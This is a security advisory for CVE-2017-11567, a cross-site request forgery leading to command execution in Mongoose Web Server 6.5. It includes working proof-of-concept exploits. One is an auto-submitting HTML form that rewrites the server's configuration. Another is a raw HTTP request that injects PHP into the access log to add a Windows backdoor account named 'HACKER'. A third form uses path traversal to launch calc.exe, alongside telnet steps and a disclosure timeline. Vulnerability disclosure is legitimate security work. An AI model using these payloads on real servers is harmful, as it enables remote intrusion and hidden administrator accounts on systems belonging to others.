@@ -1,0 +1,198 @@
+[+] Credits: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MONGOOSE-WEB-SERVER-v6.5-CSRF-COMMAND-EXECUTION.txt
+[+] ISR: apparitionSec            
+ 
+
+
+Vendor:
+===============
+www.cesanta.com
+
+
+
+Product:
+==================
+Mongoose Web Server (Free Edition)
+Mongoose-free-6.5.exe
+Download: https://cesanta.com/binary.html
+
+
+Mongoose - GitHub's most popular embedded web server
+and multi-protocol networking library
+
+Mongoose Embedded Web Server Library - Mongoose is more than an embedded webserver. It is a multi-protocol embedded networking library
+with functions including TCP, HTTP client and server, WebSocket client and server, MQTT client and broker and much more.
+
+
+
+Vulnerability Type:
+===================
+CSRF - Command Execution
+
+
+
+CVE Reference:
+==============
+CVE-2017-11567
+
+
+
+Security Issue:
+================
+Remote attackers who can lure a Mongoose web server user into clicking a malicious link or visit attacker controlled web page
+can execute system commands on the system hosting Mongoose server. However, IF Mongoose web server is installed as service then
+executing programs e.g. "calc.exe" may at times crash or fail to appear, but you may see it in Windows taskmgr.exe.
+Therefore, from my tests commands may become unstable when Mongoose is run as a service.
+
+When Mongoose is run standard mode attackers can potentially modify "Mongoose.conf" and create arbitrary files on server like .PHP etc.
+to point Mongoose to this as its new "index" file. Then you need to tell Mongoose its "access_log_file" is the new attacker generated
+file, after injecting commands into Mongoose web servers log file that will get excuted when log file is later requested.
+
+This vulnerability requires CGI interpreter to be already set or some information about the target is known like the CGI path and language
+"pl,php,cgi" used, so when we can set to use correct programming language when file is created during initial CRSF attack.
+
+Note: If running commands with arguments, we have to use "\t" tab chars as using space will break our TELNET based code injection
+to the server log.
+
+e.g.
+
+GET<?php exec("cmd.exe\t/c\tnet\tuser\tHACKER\tabc123\t/add");?> HTTP/1.1
+
+OR just TELNET to Mongoose web server, inject arbitrary commands, then call exec by making another TELNET HTTP GET.
+
+
+After Command Injection "Mongoose.conf" will be:
+
+# Mongoose web server configuration file.
+# For detailed description of every option, visit
+# https://github.com/cesanta/Mongoose
+# Lines starting with '#' and empty lines are ignored.
+# To make a change, remove leading '#', modify option's value,
+# save this file and then restart Mongoose.
+
+# access_control_list 
+access_log_file C:\Mongoose.access.php     <======= BOOM
+# auth_domain mydomain.com
+cgi_interpreter c:\xampp\php\php.exe     <====== MUST BE SET
+# cgi_pattern **.cgi$|**.pl$|**.php$
+# dav_auth_file 
+# dav_root 
+# debug 0
+document_root C:\
+# enable_directory_listing yes
+# error_log_file 
+# extra_headers 
+# extra_mime_types 
+# global_auth_file 
+# hide_files_patterns 
+# hexdump_file 
+index_files Mongoose.access.php   <======== BOOM
+# listening_port 8080
+# run_as_user 
+# ssi_pattern **.shtml$|**.shtm$
+# ssl_certificate 
+# ssl_ca_certificate 
+# start_browser yes
+# url_rewrites
+
+
+
+Mongoose log file Command Inject to create backdoor.
+-----------------------------------------------------------
+
+2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 -
+2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 -
+2017-07-24 03:12:30 - 127.0.0.1 - GET<?php exec("cmd.exe\t/c\tnet\tuser\tHACKER\tabc123\t/add");?> 400 0 -
+2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 -
+2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin?get_settings 200 4294967295 http://127.0.0.1:8080/__mg_admin
+2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin?get_cfg_file_status 200 4294967295 http://127.0.0.1:8080/__mg_admin
+2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /favicon.ico 404 0 -
+ 
+
+Tested Windows 7.
+
+
+
+Exploit/POC:
+=============
+
+1) add backdoor account POC.
+
+<form action="http://127.0.0.1:8080/__mg_admin?save" method="post">
+<input type="hidden" name="access_log_file" value="Mongoose.access.php">
+<input type="hidden" name="cgi_pattern" value="**.cgi$|**.pl$|**.php">
+<input type="hidden" name="index_files" value="Mongoose.access.php">
+<input type="hidden" name="cgi_interpreter" value="c:\xampp\php\php.exe">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+2) TELNET x.x.x.x 8080
+GET<?php exec("cmd.exe\t/c\tnet\tuser\tHACKER\tabc123\t/add");?> HTTP/1.1
+
+Enter
+
+Enter
+
+TELNET x.x.x.x 8080
+GET / HTTP/1.1
+
+Enter
+
+Enter
+
+Done, backdoor added!
+
+
+====================
+
+1) run calc.exe POC.
+
+<form action="http://127.0.0.1:8080/__mg_admin?save" method="post">
+<input type="hidden" name="cgi_pattern" value="**.cgi$|**.pl$|**.exe">
+<input type="hidden" name="index_files" value="../../../../../../Windows/system32/calc.exe">
+<input type="hidden" name="cgi_interpreter" value="../../../../../../Windows/system32/calc.exe">
+<script>document.forms[0].submit()</script>
+</form>
+
+2) TELNET x.x.x.x 8080
+GET / HTTP/1.1
+
+Enter
+
+Enter
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+=================================
+Vendor Notification: July 23, 2017
+Vendor Notification: July 28, 2017
+Vendor Acknowledgement: July 31, 2017
+Vendor Fixed released version  6.9 : September 4, 2017
+September 4, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
